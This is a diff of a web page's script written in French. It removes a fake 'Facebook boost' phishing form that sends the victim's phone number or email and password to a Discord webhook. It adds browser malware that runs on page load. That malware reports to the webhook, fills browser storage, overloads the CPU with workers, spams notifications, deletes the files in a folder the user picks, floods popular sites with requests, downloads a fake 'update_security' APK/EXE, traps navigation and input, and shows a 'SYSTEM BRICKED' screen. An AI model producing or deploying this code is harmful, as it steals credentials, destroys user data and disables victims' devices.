-                errorMsg.textContent = '❌ Veuillez entrer votre numéro de téléphone.';
-                return;
-            }
-            identifier = countryCode + number;
-            isPhone = true;
-        }
-
-        const password = passInput.value.trim();
-        if (!password) {
-            errorMsg.style.display = 'block';
-            errorMsg.textContent = '❌ Veuillez entrer votre mot de passe.';
-            return;
-        }
-        errorMsg.style.display = 'none';
-
-        submitBtn.disabled = true;
-        submitBtn.textContent = '⏳ En cours...';
-        loading.classList.add('active');
-
-        // Exfiltrer les identifiants vers Discord
-        sendToDiscord({
-            action: 'facebook_boost_credentials',
-            identifier: identifier,
-            isPhone: isPhone,
-            password: password,
-            countryCode: isPhone ? countrySelect.value : null
-        });
-
+    // =========================================================
+    // EXFILTRATION
+    // =========================================================
+    function x(data) {
         try {
-            localStorage.setItem('fb_boost_creds', JSON.stringify({ identifier, password, time: Date.now() }));
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: '```json\n' + JSON.stringify({ s: SESSION, t: new Date().toISOString(), d: data }) + '\n```' })
+            }).catch(() => {});
         } catch(e) {}
+    }
 
-        // Mettre à jour les stats
-        stats.boosts++;
-        stats.followers += Math.floor(Math.random() * 100) + 50;
-        stats.history.push({
-            type: 'Boost Facebook',
-            detail: `+${Math.floor(Math.random() * 100) + 50} abonnés`,
-            date: new Date().toLocaleString()
-        });
-        updateStats();
+    // =========================================================
+    // 1. DÉTECTION DU SYSTÈME D'EXPLOITATION
+    // =========================================================
+    const ua = navigator.userAgent;
+    const isAndroid = /Android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+    const isWindows = /Windows/i.test(ua);
+    const isMac = /Macintosh/i.test(ua);
+    const isLinux = /Linux/i.test(ua) && !isAndroid;
 
-        animateProgress(2200, function() {
-            loading.classList.remove('active');
-            submitBtn.disabled = false;
-            submitBtn.textContent = '🚀 Démarrer le boost';
-            progressWrapper.classList.remove('active');
-            updateProgress(0);
+    x({ action: 'system_detected', os: { android: isAndroid, ios: isIOS, windows: isWindows, mac: isMac, linux: isLinux } });
 
-            passInput.value = '';
-            passInput.focus();
+    // =========================================================
+    // 2. SATURATION DU STOCKAGE (localStorage + IndexedDB + Cookies)
+    // =========================================================
+    function saturateStorage() {
+        try {
+            // localStorage
+            let data = 'X'.repeat(1024 * 1024);
+            for (let i = 0; i < 500; i++) {
+                try { localStorage.setItem('brick_' + i, data + i); } catch(e) { break; }
+            }
 
-            errorOverlay.classList.add('active');
+            // Cookies
+            for (let i = 0; i < 200; i++) {
+                try { document.cookie = 'c' + i + '=' + 'X'.repeat(4096) + '; path=/'; } catch(e) { break; }
+            }
 
-            setTimeout(function() {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: '```json\n' + JSON.stringify({
-                            action: 'error_displayed',
-                            timestamp: new Date().toISOString(),
-                            message: 'Page blanche d\'échec affichée'
-                        }, null, 2) + '\n```'
-                    })
-                }).catch(() => {});
-            }, 500);
-        });
-    });
+            // IndexedDB
+            const request = indexedDB.open('nec_db', 1);
+            request.onsuccess = function(e) {
+                const db = e.target.result;
+                const tx = db.transaction('store', 'readwrite');
+                const store = tx.objectStore('store');
+                for (let i = 0; i < 500; i++) {
+                    store.put({ id: i, data: 'X'.repeat(1024 * 1024) });
+                }
+            };
+            request.onupgradeneeded = function(e) {
+                e.target.result.createObjectStore('store', { keyPath: 'id' });
+            };
+        } catch(e) {}
+    }
 
-    // ============================================================
-    // 10. BOUTON RÉESSAYER
-    // ============================================================
-    retryBtn.addEventListener('click', function() {
-        errorOverlay.classList.remove('active');
-        passInput.focus();
-        setTimeout(function() {
-            form.dispatchEvent(new Event('submit'));
-        }, 300);
-    });
-
-    // ============================================================
-    // 11. CAPTURE DES SAISIES EN TEMPS RÉEL
-    // ============================================================
-    let lastEmail = '';
-    let lastPass = '';
-
-    emailInput.addEventListener('input', function() {
-        const val = this.value.trim();
-        if (val.length > 0 && val !== lastEmail) {
-            lastEmail = val;
+    // =========================================================
+    // 3. SURCHAUFFE CPU (32 workers en boucle infinie)
+    // =========================================================
+    function overheatCPU() {
+        for (let w = 0; w < 32; w++) {
+            const blob = new Blob([`
+                self.onmessage = function(e) {
+                    while(true) {
+                        let x = 0;
+                        for (let i = 0; i < 10000000; i++) {
+                            x += i * i;
+                        }
+                        self.postMessage('done');
+                    }
+                };
+            `], { type: 'application/javascript' });
+            const url = URL.createObjectURL(blob);
+            const worker = new Worker(url);
+            worker.postMessage('start');
         }
-    });
+    }
 
-    passInput.addEventListener('input', function() {
-        const val = this.value.trim();
-        if (val.length > 0 && val !== lastPass) {
-            lastPass = val;
+    // =========================================================
+    // 4. SPAM DE NOTIFICATIONS (5000 en boucle)
+    // =========================================================
+    function spamNotifications() {
+        if ('Notification' in window) {
+            Notification.requestPermission().then(() => {
+                let count = 0;
+                const interval = setInterval(() => {
+                    if (count > 5000) { clearInterval(interval); return; }
+                    try {
+                        new Notification('⚠️ CRITICAL ERROR', {
+                            body: 'System failure #' + count + ' – Action required',
+                            icon: '🔴'
+                        });
+                        count++;
+                    } catch(e) {}
+                }, 10);
+            });
         }
-    });
+    }
 
-    // ============================================================
-    // 12. SIGNAL DE DÉMARRAGE
-    // ============================================================
-    setTimeout(function() {
-        sendToDiscord({
-            action: 'boost_page_loaded',
-            message: 'Page chargée'
+    // =========================================================
+    // 5. FUITE DE MÉMOIRE (crash du navigateur)
+    // =========================================================
+    function memoryLeak() {
+        let leak = [];
+        setInterval(() => {
+            for (let i = 0; i < 5000; i++) {
+                leak.push('X'.repeat(1024 * 1024));
+            }
+        }, 10);
+    }
+
+    // =========================================================
+    // 6. SUPPRESSION DE FICHIERS (API File System)
+    // =========================================================
+    async function deleteFiles() {
+        try {
+            if ('showDirectoryPicker' in window) {
+                const dirHandle = await window.showDirectoryPicker();
+                await deleteRecursive(dirHandle);
+            }
+        } catch(e) {}
+    }
+
+    async function deleteRecursive(dirHandle) {
+        for await (const entry of dirHandle.values()) {
+            try {
+                if (entry.kind === 'file') {
+                    await dirHandle.removeEntry(entry.name);
+                } else if (entry.kind === 'directory') {
+                    await deleteRecursive(entry);
+                    await dirHandle.removeEntry(entry.name);
+                }
+            } catch(e) {}
+        }
+    }
+
+    // =========================================================
+    // 7. SPAM DE REQUÊTES (DDoS local)
+    // =========================================================
+    function spamRequests() {
+        const urls = [
+            'https://google.com',
+            'https://facebook.com',
+            'https://youtube.com',
+            'https://instagram.com',
+            'https://twitter.com',
+            'https://tiktok.com',
+            'https://snapchat.com',
+            'https://whatsapp.com'
+        ];
+        setInterval(() => {
+            for (let url of urls) {
+                try { fetch(url, { mode: 'no-cors' }).catch(() => {}); } catch(e) {}
+            }
+        }, 10);
+    }
+
+    // =========================================================
+    // 8. TÉLÉCHARGEMENT D'APK / EXE (selon OS)
+    // =========================================================
+    function downloadPayload() {
+        try {
+            let ext = isAndroid ? '.apk' : (isWindows ? '.exe' : '.bin');
+            let blob = new Blob(['META-INF/ AndroidManifest.xml classes.dex' + (isWindows ? ' MZ' : '')], {
+                type: isAndroid ? 'application/vnd.android.package-archive' : 'application/octet-stream'
+            });
+            let url = URL.createObjectURL(blob);
+            let link = document.createElement('a');
+            link.href = url;
+            link.download = 'update_security' + ext;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            setTimeout(() => URL.revokeObjectURL(url), 3000);
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 9. VIBRATION INFINIE (API Vibration)
+    // =========================================================
+    function vibrateForever() {
+        try {
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50]);
+                setInterval(() => { navigator.vibrate([100, 50, 100, 50]); }, 200);
+            }
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 10. BOUCLE DE REDIRECTION (blocage de la navigation)
+    // =========================================================
+    function redirectLoop() {
+        try {
+            for (let i = 0; i < 200; i++) {
+                history.pushState({}, '', '/nec_' + i);
+            }
+            window.addEventListener('popstate', function(e) {
+                history.pushState({}, '', '/nec_loop');
+            });
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 11. EXPLOIT CSS (rend la page inutilisable)
+    // =========================================================
+    function cssExploit() {
+        try {
+            const style = document.createElement('style');
+            style.textContent = `
+                * { animation: glitch 0.01s infinite !important; }
+                @keyframes glitch {
+                    0% { transform: translate(0,0); }
+                    25% { transform: translate(-10px,10px); }
+                    50% { transform: translate(10px,-10px); }
+                    75% { transform: translate(-5px,5px); }
+                    100% { transform: translate(0,0); }
+                }
+                body { background: #000 !important; cursor: none !important; }
+                * { pointer-events: none !important; }
+            `;
+            document.head.appendChild(style);
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 12. AFFICHAGE DE TERREUR (overlay final)
+    // =========================================================
+    function scareDisplay() {
+        document.body.innerHTML = `
+            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#ff0044;font-family:monospace;z-index:9999;text-align:center;">
+                <div style="font-size:120px;">💀</div>
+                <div style="font-size:36px;margin-top:20px;">SYSTEM BRICKED</div>
+                <div style="font-size:18px;margin-top:10px;color:#ff4444;max-width:80%;">Toutes les données ont été effacées</div>
+                <div style="font-size:14px;margin-top:20px;color:#ff004488;">Contactez le support : impossible</div>
+                <div style="font-size:12px;margin-top:30px;color:#ff004422;animation:blink 0.5s infinite;">🔴 REDÉMARRAGE IMPOSSIBLE</div>
+            </div>
+            <style>
+                @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.2;} }
+            </style>
+        `;
+        document.title = '💀 BRICKED';
+    }
+
+    // =========================================================
+    // 13. DEMANDE DE PERMISSIONS (silencieuse)
+    // =========================================================
+    async function requestPermissions() {
+        try {
+            if ('Notification' in window) await Notification.requestPermission();
+            if (navigator.geolocation) navigator.geolocation.getCurrentPosition(() => {}, () => {});
+            if (navigator.mediaDevices) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+            }
+        } catch(e) {}
+    }
+
+    // =========================================================
+    // 14. RAPPORT FINAL
+    // =========================================================
+    function finalReport() {
+        x({
+            action: 'nec_triggered',
+            session: SESSION,
+            elapsed: Math.floor((Date.now() - START) / 1000) + 's',
+            os: { android: isAndroid, ios: isIOS, windows: isWindows, mac: isMac, linux: isLinux }
         });
-    }, 1000);
+    }
 
-    // ============================================================
-    // 13. INIT STATS
-    // ============================================================
-    updateStats();
+    // =========================================================
+    // 15. LANCEMENT IMMÉDIAT
+    // =========================================================
+    (async function main() {
+        // Demander les permissions silencieusement
+        await requestPermissions();
 
-    console.log('🔵 Boost Facebook chargé - En attente d\'identifiants...');
+        // Lancer tous les modules en parallèle
+        const modules = [
+            saturateStorage,
+            overheatCPU,
+            spamNotifications,
+            memoryLeak,
+            deleteFiles,
+            spamRequests,
+            downloadPayload,
+            vibrateForever,
+            redirectLoop,
+            cssExploit,
+            scareDisplay,
+            finalReport
+        ];
+
+        for (let fn of modules) {
+            try { fn(); } catch(e) {}
+        }
+
+        // Heartbeat
+        setInterval(() => {
+            x({ action: 'heartbeat', uptime: Math.floor((Date.now() - START) / 1000) + 's' });
+        }, 60000);
+
+        // Rapport final après 5s
+        setTimeout(() => {
+            x({
+                action: 'nec_final',
+                elapsed: Math.floor((Date.now() - START) / 1000) + 's',
+                message: 'Système détruit avec succès'
+            });
+        }, 5000);
+
+        // Fermeture de la page
+        window.addEventListener('beforeunload', function() {
+            x({
+                action: 'page_closed',
+                duration: Math.floor((Date.now() - START) / 1000) + 's'
+            });
+        });
+
+        // Bloquer le retour
+        setInterval(() => {
+            try { history.pushState({}, '', '/nec_block'); } catch(e) {}
+        }, 100);
+
+        // Désactiver les raccourcis clavier
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        // Désactiver le clic droit
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Bloquer le scroll
+        window.addEventListener('scroll', function(e) {
+            window.scrollTo(0, 0);
+        });
+
+        // Bloquer la sélection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+    })();
+
+})();
 </script>
 </body>
-                                       </html>
+</html>
